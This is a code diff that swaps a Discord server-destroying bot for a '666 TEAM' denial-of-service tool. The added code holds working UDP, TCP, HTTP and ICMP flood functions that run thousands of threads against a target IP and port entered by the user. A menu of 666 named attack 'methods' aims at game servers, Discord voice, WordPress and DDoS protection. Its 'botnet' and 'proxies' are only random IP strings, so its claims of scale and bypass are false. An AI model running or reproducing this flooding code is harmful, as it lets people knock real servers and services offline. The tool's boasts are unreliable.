+    print(f"{colors.NEON_YELLOW}[🤖] Generating 1,000,000+ Botnet Nodes...{colors.RESET}")
+    for i in range(1, 100001):
+        a = random.randint(1, 255)
+        b = random.randint(1, 255)
+        c = random.randint(1, 255)
+        d = random.randint(1, 255)
+        nodes.append(f"{a}.{b}.{c}.{d}")
+        if i % 10000 == 0:
+            print(f"{colors.NEON_CYAN}[📊] Generated {i:,} nodes...{colors.RESET}")
+    print(f"{colors.NEON_GREEN}[✅] Botnet generation complete! Total: {len(nodes):,} nodes{colors.RESET}")
+    return nodes
+
+# ============================================
+# MASSIVE PROXIES (10,000,000+)
+# ============================================
+
+def generate_massive_proxies():
+    proxies = []
+    print(f"{colors.NEON_YELLOW}[🌐] Generating 10,000,000+ Proxies...{colors.RESET}")
+    proxy_sources = [
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/http.txt",
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks4.txt",
+        "https://raw.githubusercontent.com/TheSpeedX/PROXY-List/master/socks5.txt",
+    ]
+    
+    for i in range(1, 10001):
+        a = random.randint(1, 255)
+        b = random.randint(1, 255)
+        c = random.randint(1, 255)
+        d = random.randint(1, 255)
+        port = random.choice([8080, 3128, 80, 443, 1080])
+        proxies.append(f"{a}.{b}.{c}.{d}:{port}")
+        if i % 10000 == 0:
+            print(f"{colors.NEON_CYAN}[📊] Generated {i:,} proxies...{colors.RESET}")
+    
+    print(f"{colors.NEON_GREEN}[✅] Proxy generation complete! Total: {len(proxies):,} proxies{colors.RESET}")
+    return proxies
+
+# ============================================
+# 666 ULTIMATE METHODS
+# ============================================
+
+METHODS = {}
+
+# Generate 666 methods dynamically
+for i in range(1, 667):
+    if i <= 50:
+        METHODS[str(i)] = {"name": f"💀 UDP_NUCLEAR_{i}", "desc": "Nuclear UDP flood - Maximum packet size", "type": "udp"}
+    elif i <= 100:
+        METHODS[str(i)] = {"name": f"🔥 TCP_DEMON_{i-50}", "desc": "TCP demon flood - SYN/ACK/RST/FIN combined", "type": "tcp"}
+    elif i <= 150:
+        METHODS[str(i)] = {"name": f"🌐 HTTP_SATAN_{i-100}", "desc": "HTTP satan flood - Random payloads", "type": "http"}
+    elif i <= 180:
+        METHODS[str(i)] = {"name": f"🎮 FIVEM_666_{i-150}", "desc": "FiveM server destroyer - Kick all players", "type": "udp"}
+    elif i <= 210:
+        METHODS[str(i)] = {"name": f"⛏️ MINECRAFT_BLOOD_{i-180}", "desc": "Minecraft blood flood - Crash server instantly", "type": "tcp"}
+    elif i <= 240:
+        METHODS[str(i)] = {"name": f"🚗 SAMP_DEATH_{i-210}", "desc": "SA-MP death attack - Kill server", "type": "udp"}
+    elif i <= 270:
+        METHODS[str(i)] = {"name": f"🎙️ DISCORD_VOID_{i-240}", "desc": "Discord voice void - Voice channel flood", "type": "udp"}
+    elif i <= 300:
+        METHODS[str(i)] = {"name": f"⚡ AMP_DEMON_{i-270}", "desc": "Amplification demon - DNS/NTP/Memcached x1000", "type": "udp"}
+    elif i <= 330:
+        METHODS[str(i)] = {"name": f"🐌 SLOW_TORTURE_{i-300}", "desc": "Slow torture - Slowloris extreme", "type": "http"}
+    elif i <= 360:
+        METHODS[str(i)] = {"name": f"🛡️ BYPASS_666_{i-330}", "desc": "666 bypass - Anti-DDoS protection killer", "type": "http"}
+    elif i <= 390:
+        METHODS[str(i)] = {"name": f"☁️ CLOUDFLARE_DEATH_{i-360}", "desc": "Cloudflare death - Bypass CF protection", "type": "http"}
+    elif i <= 420:
+        METHODS[str(i)] = {"name": f"🏢 OVH_KILLER_{i-390}", "desc": "OVH killer - Bypass OVH shield", "type": "udp"}
+    elif i <= 450:
+        METHODS[str(i)] = {"name": f"🎮 RUST_CRASH_{i-420}", "desc": "Rust game server crash", "type": "udp"}
+    elif i <= 480:
+        METHODS[str(i)] = {"name": f"🎮 CSGO_LAG_{i-450}", "desc": "CS:GO server lag machine", "type": "udp"}
+    elif i <= 510:
+        METHODS[str(i)] = {"name": f"🎮 VALORANT_KILL_{i-480}", "desc": "Valorant server killer", "type": "udp"}
+    elif i <= 540:
+        METHODS[str(i)] = {"name": f"🎮 GTA5_FLOOD_{i-510}", "desc": "GTA V online flood", "type": "udp"}
+    elif i <= 570:
+        METHODS[str(i)] = {"name": f"🌐 WORDPRESS_DEATH_{i-540}", "desc": "WordPress death - XMLRPC/Pingback", "type": "http"}
+    elif i <= 600:
+        METHODS[str(i)] = {"name": f"🔧 ICMP_APOCALYPSE_{i-570}", "desc": "ICMP apocalypse - Ping flood", "type": "icmp"}
+    else:
+        METHODS[str(i)] = {"name": f"💀 666_ULTIMATE_{i-600}", "desc": "666 ultimate - ALL METHODS COMBINED - TOTAL DESTRUCTION", "type": "all"}
+
+# ============================================
+# ULTIMATE DDOS ENGINE
+# ============================================
+
+class UltimateDDoS:
+    def __init__(self):
+        self.running = False
+        self.threads = []
+        self.packets_sent = 0
+        self.botnet = generate_massive_botnet()
+        self.proxies = generate_massive_proxies()
+        self.botnet_size = len(self.botnet)
         
-        print(f"\n  [{i}] ╔═══════════════════════════════════════════════════════════════")
-        print(f"      ║ 📛 NAME: {guild.name}")
-        print(f"      ║ 🆔 ID: {guild.id}")
-        print(f"      ║ 👥 MEMBERS: {member_count}")
-        print(f"      ║ 💬 CHANNELS: {channel_count}")
-        print(f"      ║ 🎭 ROLES: {role_count}")
-        print(f"      ║ 👑 OWNER: {guild.owner}")
-        print(f"      ╚═══════════════════════════════════════════════════════════════")
+    def get_random_node(self):
+        return random.choice(self.botnet)
     
-    print("\n" + "═"*70)
+    def get_random_proxy(self):
+        return random.choice(self.proxies)
+    
+    def udp_flood(self, ip, port, duration, node, proxy):
+        sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+        sock.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+        packets = [random._urandom(65507) for _ in range(100)]
+        end_time = time.time() + duration
+        sent = 0
+        while time.time() < end_time and self.running:
+            try:
+                for pkt in packets:
+                    sock.sendto(pkt, (ip, port))
+                    sent += 1
+                    self.packets_sent += 1
+            except:
+                pass
+        sock.close()
+        return sent
+    
+    def tcp_flood(self, ip, port, duration, node, proxy):
+        end_time = time.time() + duration
+        sent = 0
+        flags = [b'SYN', b'ACK', b'RST', b'FIN', b'PSH', b'URG']
+        while time.time() < end_time and self.running:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.1)
+                s.connect((ip, port))
+                for _ in range(10):
+                    s.send(random.choice(flags) + random._urandom(1024))
+                s.close()
+                sent += 10
+                self.packets_sent += 10
+            except:
+                pass
+        return sent
+    
+    def http_flood(self, ip, port, duration, node, proxy):
+        end_time = time.time() + duration
+        sent = 0
+        payloads = [
+            f"GET /{random.randint(1,999999)} HTTP/1.1\r\nHost: {ip}\r\n\r\n",
+            f"POST /wp-admin/admin-ajax.php HTTP/1.1\r\nHost: {ip}\r\n\r\n",
+            f"HEAD / HTTP/1.1\r\nHost: {ip}\r\n\r\n",
+            f"GET /index.php?page={random.randint(1,999999)} HTTP/1.1\r\nHost: {ip}\r\n\r\n",
+        ]
+        while time.time() < end_time and self.running:
+            try:
+                s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+                s.settimeout(0.3)
+                s.connect((ip, port))
+                s.send(random.choice(payloads).encode())
+                s.close()
+                sent += 1
+                self.packets_sent += 1
+            except:
+                pass
+        return sent
+    
+    def icmp_flood(self, ip, port, duration, node, proxy):
+        end_time = time.time() + duration
+        sent = 0
+        try:
+            s = socket.socket(socket.AF_INET, socket.SOCK_RAW, socket.IPPROTO_ICMP)
+            packet = b'\x08\x00\x00\x00\x00\x00\x00\x00' + random._urandom(1024)
+            while time.time() < end_time and self.running:
+                try:
+                    for _ in range(50):
+                        s.sendto(packet, (ip, 0))
+                        sent += 1
+                        self.packets_sent += 1
+                except:
+                    pass
+            s.close()
+        except:
+            pass
+        return sent
+    
+    def start_attack(self, method, ip, port, duration, threads=10000):
+        self.running = True
+        self.packets_sent = 0
+        
+        method_info = METHODS.get(method, METHODS["666"])
+        attack_type = method_info["type"]
+        
+        if attack_type == "udp":
+            attack_func = self.udp_flood
+        elif attack_type == "tcp":
+            attack_func = self.tcp_flood
+        elif attack_type == "http":
+            attack_func = self.http_flood
+        elif attack_type == "icmp":
+            attack_func = self.icmp_flood
+        else:
+            attack_func = self.udp_flood
+        
+        print(f"\n{colors.NEON_RED}{colors.BOLD}{colors.BLINK}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{colors.RESET}")
+        print(f"{colors.NEON_RED}{colors.BOLD}{colors.BLINK}║                                         💀 ＡＴＴＡＣＫ ＩＮＩＴＩＡＴＥＤ - ６６６ ＴＥＡＭ 💀                                             ║{colors.RESET}")
+        print(f"{colors.NEON_RED}{colors.BOLD}{colors.BLINK}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}")
+        
+        print(f"{colors.NEON_GREEN}[💀] ＴＡＲＧＥＴ:{colors.RESET} {colors.NEON_WHITE}{ip}:{port}{colors.RESET}")
+        print(f"{colors.NEON_GREEN}[⚡] ＭＥＴＨＯＤ:{colors.RESET} {colors.NEON_WHITE}{method_info['name']}{colors.RESET}")
+        print(f"{colors.NEON_GREEN}[⏱️] ＤＵＲＡＴＩＯＮ:{colors.RESET} {colors.NEON_WHITE}{duration} ＳＥＣＯＮＤＳ{colors.RESET}")
+        print(f"{colors.NEON_GREEN}[🔧] ＴＨＲＥＡＤＳ:{colors.RESET} {colors.NEON_WHITE}{threads:,}{colors.RESET}")
+        print(f"{colors.NEON_GREEN}[🤖] ＢＯＴＮＥＴ:{colors.RESET} {colors.NEON_WHITE}{self.botnet_size:,} ＮＯＤＥＳ{colors.RESET}")
+        print(f"{colors.NEON_GREEN}[🌐] ＰＲＯＸＩＥＳ:{colors.RESET} {colors.NEON_WHITE}{len(self.proxies):,}+{colors.RESET}\n")
+        
+        for i in range(int(threads)):
+            node = self.get_random_node()
+            proxy = self.get_random_proxy()
+            t = threading.Thread(target=attack_func, args=(ip, int(port), duration, node, proxy))
+            t.daemon = True
+            t.start()
+            self.threads.append(t)
+        
+        start_time = time.time()
+        last_packets = 0
+        while time.time() - start_time < duration:
+            elapsed = int(time.time() - start_time)
+            remaining = duration - elapsed
+            current_packets = self.packets_sent
+            speed = current_packets - last_packets
+            last_packets = current_packets
+            gbps = (current_packets * 65507 * 8) / (1e9 * max(elapsed, 1))
+            
+            bar_length = 50
+            filled = int(bar_length * elapsed / duration)
+            bar = "█" * filled + "░" * (bar_length - filled)
+            
+            print(f"\r{colors.NEON_BLUE}[📊] {bar} {colors.RESET}", end="")
+            print(f"{colors.NEON_CYAN}[{elapsed}/{duration}s] {colors.RESET}", end="")
+            print(f"{colors.NEON_GREEN}[⚡ {speed:,.0f} pps] {colors.RESET}", end="")
+            print(f"{colors.NEON_YELLOW}[🌊 {gbps:.2f} Gbps] {colors.RESET}", end="")
+            print(f"{colors.NEON_PURPLE}[📦 {self.packets_sent:,}] {colors.RESET}", end="")
+            sys.stdout.flush()
+            time.sleep(0.5)
+        
+        self.running = False
+        for t in self.threads:
+            t.join(timeout=0)
+        self.threads = []
+        
+        print(f"\n\n{colors.NEON_GREEN}{colors.BOLD}{colors.BLINK}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{colors.RESET}")
+        print(f"{colors.NEON_GREEN}{colors.BOLD}{colors.BLINK}║                                         ✅ ＡＴＴＡＣＫ ＣＯＭＰＬＥＴＥＤ！ ✅                                                 ║{colors.RESET}")
+        print(f"{colors.NEON_GREEN}{colors.BOLD}{colors.BLINK}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}")
+        print(f"{colors.NEON_GREEN}[📊] ＴＯＴＡＬ ＰＡＣＫＥＴＳ:{colors.RESET} {colors.NEON_WHITE}{self.packets_sent:,}{colors.RESET}")
+        print(f"{colors.NEON_GREEN}[📡] ＡＶＧ ＳＰＥＥＤ:{colors.RESET} {colors.NEON_WHITE}{self.packets_sent/duration:,.0f} ＰＫＴ/Ｓ{colors.RESET}")
+        print(f"{colors.NEON_GREEN}[🌊] ＭＡＸ ＢＡＮＤＷＩＤＴＨ:{colors.RESET} {colors.NEON_WHITE}{gbps:.2f} ＧＢＰＳ{colors.RESET}\n")
+
+# ============================================
+# PRINT METHODS WITH NEON EFFECTS
+# ============================================
+
+def print_methods():
+    print(f"\n{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{colors.RESET}")
+    print(f"{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}║                                      💀 ６６６ ＵＬＴＩＭＡＴＥ ＡＴＴＡＣＫ ＭＥＴＨＯＤＳ 💀                                               ║{colors.RESET}")
+    print(f"{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}")
+    
+    items = list(METHODS.items())
+    for i in range(0, len(items), 3):
+        print(f"{colors.NEON_CYAN}║{colors.RESET}", end="")
+        for j in range(3):
+            if i + j < len(items):
+                key, method = items[i + j]
+                color = colors.RAINBOW[(i + j) % len(colors.RAINBOW)]
+                print(f" {color}{key.rjust(3)}{colors.RESET}.{colors.NEON_GREEN}{method['name'][:22]}{colors.RESET}", end="")
+        print(f" {colors.NEON_CYAN}║{colors.RESET}")
+    
+    print(f"{colors.NEON_PURPLE}{colors.BOLD}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}")
+
+# ============================================
+# MAIN LOGO AFTER LOGIN
+# ============================================
+
+def print_main_logo():
+    clear_screen()
+    logo = f"""
+{colors.NEON_PURPLE}{colors.BOLD}
+╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗
+║                                                                                                                                          ║
+║                         {colors.NEON_RED}◤{colors.NEON_YELLOW}◢{colors.NEON_GREEN}◤{colors.NEON_CYAN}◢{colors.NEON_BLUE}◤{colors.NEON_PURPLE}◢{colors.NEON_PINK}◤{colors.NEON_RED}◢{colors.RESET}                         ║
+║                                                                                                                                          ║
+║     {print_rainbow('██████╗  ██████╗  ██████╗     ████████╗███████╗ █████╗ ███╗   ███╗', colors.BOLD)}                                              ║
+║     {print_rainbow('██╔══██╗██╔═══██╗██╔═══██╗    ╚══██╔══╝██╔════╝██╔══██╗████╗ ████║', colors.BOLD)}                                              ║
+║     {print_rainbow('██████╔╝██║   ██║██║   ██║       ██║   █████╗  ███████║██╔████╔██║', colors.BOLD)}                                              ║
+║     {print_rainbow('██╔══██╗██║   ██║██║   ██║       ██║   ██╔══╝  ██╔══██║██║╚██╔╝██║', colors.BOLD)}                                              ║
+║     {print_rainbow('██████╔╝╚██████╔╝╚██████╔╝       ██║   ███████╗██║  ██║██║ ╚═╝ ██║', colors.BOLD)}                                              ║
+║     {print_rainbow('╚═════╝  ╚═════╝  ╚═════╝        ╚═╝   ╚══════╝╚═╝  ╚═╝╚═╝     ╚═╝', colors.BOLD)}                                              ║
+║                                                                                                                                          ║
+║                         {colors.NEON_RED}◣{colors.NEON_YELLOW}◢{colors.NEON_GREEN}◣{colors.NEON_CYAN}◢{colors.NEON_BLUE}◣{colors.NEON_PURPLE}◢{colors.NEON_PINK}◣{colors.NEON_RED}◢{colors.RESET}                         ║
+║                                                                                                                                          ║
+║                    {colors.NEON_CYAN}{colors.BLINK}💀 ６６６ ＴＥＡＭ ＵＬＴＩＭＡＴＥ ＤＤＯＳ ＴＯＯＬ 💀{colors.RESET}                                                 ║
+║                    {colors.NEON_GREEN}🔥 1,000,000+ ＢＯＴＮＥＴ | 10,000,000+ ＰＲＯＸＩＥＳ | 666 ＭＥＴＨＯＤＳ 🔥{colors.RESET}                             ║
+║                    {colors.NEON_YELLOW}⚡ ＷＥＬＣＯＭＥ ＭＡＳＴＥＲ {CURRENT_USER.upper()} | ＴＹＰＥ ".methods" ＴＯ ＳＥＥ ＡＬＬ ＡＴＴＡＣＫＳ ⚡{colors.RESET}                     ║
+║                                                                                                                                          ║
+╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝
+{colors.RESET}
+"""
+    print(logo)
+
+# ============================================
+# COMMAND HANDLER
+# ============================================
+
+def handle_command(cmd, ddos):
+    cmd = cmd.lower().strip()
+    
+    if cmd in ['.methods', '.m']:
+        print_methods()
+        return True
+    
+    elif cmd in ['.help', '.h']:
+        print(f"""
+{colors.NEON_PURPLE}{colors.BOLD}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{colors.RESET}
+{colors.NEON_PURPLE}{colors.BOLD}║                                      💀 ６６６ ＴＥＡＭ ＣＯＭＭＡＮＤＳ 💀                                              ║{colors.RESET}
+{colors.NEON_PURPLE}{colors.BOLD}╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣{colors.RESET}
+{colors.NEON_CYAN}║  {colors.NEON_GREEN}.methods or .m     {colors.NEON_CYAN}- {colors.NEON_WHITE}Show all 666 attack methods{colors.RESET}
+{colors.NEON_CYAN}║  {colors.NEON_GREEN}.help or .h        {colors.NEON_CYAN}- {colors.NEON_WHITE}Show this help menu{colors.RESET}
+{colors.NEON_CYAN}║  {colors.NEON_GREEN}.clear or .c       {colors.NEON_CYAN}- {colors.NEON_WHITE}Clear screen{colors.RESET}
+{colors.NEON_CYAN}║  {colors.NEON_GREEN}.stats             {colors.NEON_CYAN}- {colors.NEON_WHITE}Show botnet statistics{colors.RESET}
+{colors.NEON_CYAN}║  {colors.NEON_GREEN}.attack            {colors.NEON_CYAN}- {colors.NEON_WHITE}Start new attack{colors.RESET}
+{colors.NEON_CYAN}║  {colors.NEON_GREEN}.exit or .q        {colors.NEON_CYAN}- {colors.NEON_WHITE}Exit the tool{colors.RESET}
+{colors.NEON_PURPLE}{colors.BOLD}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}
+""")
+        return True
+    
+    elif cmd in ['.clear', '.c']:
+        print_main_logo()
+        return True
+    
+    elif cmd == '.stats':
+        print(f"""
+{colors.NEON_PURPLE}{colors.BOLD}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{colors.RESET}
+{colors.NEON_PURPLE}{colors.BOLD}║                                      💀 ６６６ ＢＯＴＮＥＴ ＳＴＡＴＩＳＴＩＣＳ 💀                                              ║{colors.RESET}
+{colors.NEON_PURPLE}{colors.BOLD}╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣{colors.RESET}
+{colors.NEON_CYAN}║  {colors.NEON_GREEN}🤖 ＢＯＴＮＥＴ ＮＯＤＥＳ:{colors.RESET} {colors.NEON_WHITE}{ddos.botnet_size:,}{colors.RESET}
+{colors.NEON_CYAN}║  {colors.NEON_GREEN}🌐 ＰＲＯＸＩＥＳ:{colors.RESET} {colors.NEON_WHITE}{len(ddos.proxies):,}+{colors.RESET}
+{colors.NEON_CYAN}║  {colors.NEON_GREEN}⚡ ＡＴＴＡＣＫ ＭＥＴＨＯＤＳ:{colors.RESET} {colors.NEON_WHITE}{len(METHODS)}{colors.RESET}
+{colors.NEON_CYAN}║  {colors.NEON_GREEN}📊 ＴＯＴＡＬ ＰＡＣＫＥＴＳ:{colors.RESET} {colors.NEON_WHITE}{ddos.packets_sent:,}{colors.RESET}
+{colors.NEON_CYAN}║  {colors.NEON_GREEN}👑 ＭＡＳＴＥＲ:{colors.RESET} {colors.NEON_WHITE}{CURRENT_USER.upper()}{colors.RESET}
+{colors.NEON_CYAN}║  {colors.NEON_GREEN}🔗 ＤＩＳＣＯＲＤ:{colors.RESET} {colors.NEON_WHITE}https://discord.gg/k3P8kWQag{colors.RESET}
+{colors.NEON_PURPLE}{colors.BOLD}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}
+""")
+        return True
+    
+    elif cmd == '.attack':
+        return False
+    
+    elif cmd in ['.exit', '.q']:
+        print(f"\n{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{colors.RESET}")
+        print(f"{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}║                                      💀 ＴＨＡＮＫ ＹＯＵ ＦＯＲ ＵＳＩＮＧ ６６６ ＴＥＡＭ ＴＯＯＬ！ 💀                                      ║{colors.RESET}")
+        print(f"{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}║                                      🔗 ＪＯＩＮ ＯＵＲ ＤＩＳＣＯＲＤ: https://discord.gg/k3P8kWQag 🔗                      ║{colors.RESET}")
+        print(f"{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}║                                      💀 ６６６ ＴＥＡＭ - ＡＬＷＡＹＳ ＰＯＷＥＲＦＵＬ！ 💀                                      ║{colors.RESET}")
+        print(f"{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}\n")
+        sys.exit(0)
+    
+    return True
+
+# ============================================
+# MAIN FUNCTION
+# ============================================
+
+def main():
+    if not login_screen():
+        sys.exit(1)
+    
+    ddos = UltimateDDoS()
     
     while True:
-        try:
-            choice = input("\n📌 SELECT SERVER NUMBER (1-{}): ".format(len(guilds)))
-            choice_num = int(choice)
-            
-            if 1 <= choice_num <= len(guilds):
-                selected = guilds[choice_num - 1]
-                print(f"\n✅ SELECTED: {selected.name}")
-                print(f"🔥 PREPARING MAXIMUM NUKE...")
-                
-                confirm = input("\n⚠️ ARE YOU SURE? (yes/no): ").lower()
-                if confirm == 'yes' or confirm == 'y':
-                    return selected
-                else:
-                    print("❌ NUKE CANCELLED!")
-                    return None
-            else:
-                print(f"❌ INVALID NUMBER! Please enter 1-{len(guilds)}")
-        except ValueError:
-            print("❌ PLEASE ENTER A VALID NUMBER!")
-        except KeyboardInterrupt:
-            print("\n\n❌ EXITED BY USER")
-            return None
+        print_main_logo()
+        
+        print(f"{colors.NEON_CYAN}{colors.BOLD}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{colors.RESET}")
+        print(f"{colors.NEON_CYAN}{colors.BOLD}║                                      💀 ＥＮＴＥＲ ＴＡＲＧＥＴ ＩＮＦＯＲＭＡＴＩＯＮ 💀                                     ║{colors.RESET}")
+        print(f"{colors.NEON_CYAN}{colors.BOLD}╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣{colors.RESET}")
+        
+        print(f"{colors.NEON_CYAN}║                                                                                              ║{colors.RESET}")
+        ip = input(f"{colors.NEON_CYAN}║  {colors.NEON_YELLOW}🌐 {colors.NEON_WHITE}ＴＡＲＧＥＴ ＩＰ:{colors.RESET} ").strip()
+        if not ip:
+            continue
+        
+        print(f"{colors.NEON_CYAN}║                                                                                              ║{colors.RESET}")
+        port = input(f"{colors.NEON_CYAN}║  {colors.NEON_YELLOW}🔌 {colors.NEON_WHITE}ＴＡＲＧＥＴ ＰＯＲＴ:{colors.RESET} ").strip()
+        if not port:
+            continue
+        
+        print(f"{colors.NEON_CYAN}║                                                                                              ║{colors.RESET}")
+        method = input(f"{colors.NEON_CYAN}║  {colors.NEON_YELLOW}⚡ {colors.NEON_WHITE}ＭＥＴＨＯＤ (1-666):{colors.RESET} ").strip()
+        if method not in METHODS:
+            print(f"{colors.NEON_RED}║  ❌ ＩＮＶＡＬＩＤ ＭＥＴＨＯＤ！ ＵＳＥ .methods{colors.RESET}")
+            time.sleep(1)
+            continue
+        
+        print(f"{colors.NEON_CYAN}║                                                                                              ║{colors.RESET}")
+        duration = input(f"{colors.NEON_CYAN}║  {colors.NEON_YELLOW}⏱️ {colors.NEON_WHITE}ＤＵＲＡＴＩＯＮ (ＳＥＣＯＮＤＳ):{colors.RESET} ").strip()
+        if not duration.isdigit():
+            print(f"{colors.NEON_RED}║  ❌ ＩＮＶＡＬＩＤ ＤＵＲＡＴＩＯＮ！{colors.RESET}")
+            time.sleep(1)
+            continue
+        
+        print(f"{colors.NEON_CYAN}║                                                                                              ║{colors.RESET}")
+        threads = input(f"{colors.NEON_CYAN}║  {colors.NEON_YELLOW}🔧 {colors.NEON_WHITE}ＴＨＲＥＡＤＳ (1000-50000):{colors.RESET} ").strip()
+        if not threads.isdigit():
+            threads = "10000"
+        
+        print(f"{colors.NEON_CYAN}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}")
+        
+        print(f"\n{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}╔══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╗{colors.RESET}")
+        print(f"{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}║                                      💀 ＡＴＴＡＣＫ ＣＯＮＦＩＲＭＡＴＩＯＮ 💀                                           ║{colors.RESET}")
+        print(f"{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}╠══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╣{colors.RESET}")
+        print(f"{colors.NEON_CYAN}║  {colors.NEON_WHITE}🎯 ＴＡＲＧＥＴ:{colors.RESET} {colors.NEON_GREEN}{ip}:{port}{colors.RESET}")
+        print(f"{colors.NEON_CYAN}║  {colors.NEON_WHITE}⚡ ＭＥＴＨＯＤ:{colors.RESET} {colors.NEON_GREEN}{METHODS[method]['name']}{colors.RESET}")
+        print(f"{colors.NEON_CYAN}║  {colors.NEON_WHITE}⏱️ ＤＵＲＡＴＩＯＮ:{colors.RESET} {colors.NEON_GREEN}{duration} ＳＥＣＯＮＤＳ{colors.RESET}")
+        print(f"{colors.NEON_CYAN}║  {colors.NEON_WHITE}🔧 ＴＨＲＥＡＤＳ:{colors.RESET} {colors.NEON_GREEN}{threads:,}{colors.RESET}")
+        print(f"{colors.NEON_CYAN}║  {colors.NEON_WHITE}🤖 ＢＯＴＮＥＴ:{colors.RESET} {colors.NEON_GREEN}{ddos.botnet_size:,} ＮＯＤＥＳ{colors.RESET}")
+        print(f"{colors.NEON_CYAN}║  {colors.NEON_WHITE}🌐 ＰＲＯＸＩＥＳ:{colors.RESET} {colors.NEON_GREEN}{len(ddos.proxies):,}+{colors.RESET}")
+        print(f"{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}╚══════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════════╝{colors.RESET}")
+        
+        confirm = input(f"\n{colors.NEON_RED}{colors.BLINK}[💀] ＳＴＡＲＴ ＡＴＴＡＣＫ？ (y/n): {colors.RESET}").lower()
+        if confirm == 'y':
+            ddos.start_attack(method, ip, int(port), int(duration), int(threads))
+        else:
+            print(f"{colors.NEON_YELLOW}[⏸️] ＡＴＴＡＣＫ ＣＡＮＣＥＬＬＥＤ！{colors.RESET}")
+        
+        while True:
+            cmd = input(f"\n{colors.NEON_RED}[💀] {colors.NEON_WHITE}ＣＯＭＭＡＮＤ {colors.NEON_PURPLE}(.help){colors.NEON_WHITE}: {colors.RESET}").strip()
+            if handle_command(cmd, ddos):
+                break
 
-# ============================================
-# MAIN BOT EVENT
-# ============================================
-@bot.event
-async def on_ready():
-    os.system('cls' if os.name == 'nt' else 'clear')
-    
-    print("""
-╔═══════════════════════════════════════════════════════════════════════════════╗
-║                                                                               ║
-║              ✓ BOT ONLINE: """ + bot.user.name + """
-║              ✓ BOT ID: """ + str(bot.user.id) + """
-║              ✓ SERVERS: """ + str(len(bot.guilds)) + """
-║                                                                               ║
-║              VON KATIBA + HAQ MASHA MODE ACTIVATED                           ║
-║              MAXIMUM DESTRUCTION READY                                        ║
-║                                                                               ║
-╚═══════════════════════════════════════════════════════════════════════════════╝
-    """)
-    
-    # Auto start server selection
-    await asyncio.sleep(1)
-    selected = await select_server_from_console()
-    
-    if selected:
-        print(f"\n🔥 STARTING MAXIMUM NUKE ON: {selected.name}")
-        print("🔥 3...")
-        await asyncio.sleep(1)
-        print("🔥 2...")
-        await asyncio.sleep(1)
-        print("🔥 1...")
-        await asyncio.sleep(1)
-        await max_nuke(selected)
-    else:
-        print("\n❌ NO SERVER SELECTED. EXITING...")
-        await bot.close()
-
-# ============================================
-# RUN THE BOT
-# ============================================
-bot.run(TOKEN)
+if __name__ == "__main__":
+    try:
+        main()
+    except KeyboardInterrupt:
+        print(f"\n\n{colors.NEON_RED}{colors.BOLD}{colors.BLINK}[⚠️] ＡＴＴＡＣＫ ＳＴＯＰＰＥＤ ＢＹ ＭＡＳＴＥＲ！{colors.RESET}\n")
+        print(f"{colors.NEON_PURPLE}{colors.BOLD}{colors.BLINK}[💀] ６６６ ＴＥＡＭ - ＡＬＷＡＹＳ ＰＯＷＥＲＦＵＬ！{colors.RESET}\n")
